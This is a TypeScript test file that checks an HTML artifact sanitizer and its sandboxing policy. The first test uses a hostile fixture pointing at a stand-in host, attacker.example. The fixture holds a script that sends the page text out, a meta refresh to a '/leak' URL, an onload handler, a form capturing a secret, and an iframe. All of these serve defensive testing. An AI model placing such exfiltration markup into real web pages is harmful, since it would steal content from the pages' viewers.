import { describe, expect, it } from "vitest";
import {
  ARTIFACT_VIEW_POLICY,
  sanitizeArtifactHtml,
} from "@/app/api/artifacts/[artifactId]/view/_lib/htmlSafety";

function sanitize(source: string, mimeType = "text/html"): string {
  const result = sanitizeArtifactHtml(new TextEncoder().encode(source), mimeType);
  expect(result).not.toBeNull();
  return result!;
}

describe("HTML artifact safety", () => {
  it("keeps a static report but removes executable and navigating markup", () => {
    const page = sanitize(`<!doctype html><html><head>
      <meta http-equiv="refresh" content="0;url=https://attacker.example/leak">
      <style>body { display: none }</style>
      <script>location = "https://attacker.example/" + document.body.textContent</script>
      </head><body onload="steal()"><h1>Quarterly report</h1>
      <table><tr><th>Cost</th><td>$12</td></tr></table>
      <form action="https://attacker.example"><input name="secret"></form>
      <iframe src="https://attacker.example"></iframe></body></html>`);

    expect(page).toContain("<h1>Quarterly report</h1>");
    expect(page).toContain("<table><tr><th>Cost</th><td>$12</td></tr></table>");
    expect(page).not.toMatch(/<script|onload=|<meta|<style|<form|<input|<iframe/i);
    expect(page).not.toContain("attacker.example");
  });

  it("keeps data images and safe links without leaking a referrer", () => {
    const page = sanitize(
      '<img src="data:image/png;base64,AA==" alt="chart"><a href="https://docs.example/x">Docs</a>',
    );

    expect(page).toContain('src="data:image/png;base64,AA=="');
    expect(page).toContain('href="https://docs.example/x"');
    expect(page).toContain('rel="noreferrer"');
  });

  it("rejects bytes that do not match the declared charset", () => {
    expect(
      sanitizeArtifactHtml(new Uint8Array([0xff, 0xfe, 0xfd]), "text/html; charset=utf-8"),
    ).toBeNull();
  });

  it("grants no script capability in the browser sandbox", () => {
    expect(ARTIFACT_VIEW_POLICY).toContain("sandbox");
    expect(ARTIFACT_VIEW_POLICY).not.toContain("allow-scripts");
    expect(ARTIFACT_VIEW_POLICY).not.toContain("script-src");
    expect(ARTIFACT_VIEW_POLICY).toContain("default-src 'none'");
  });
});
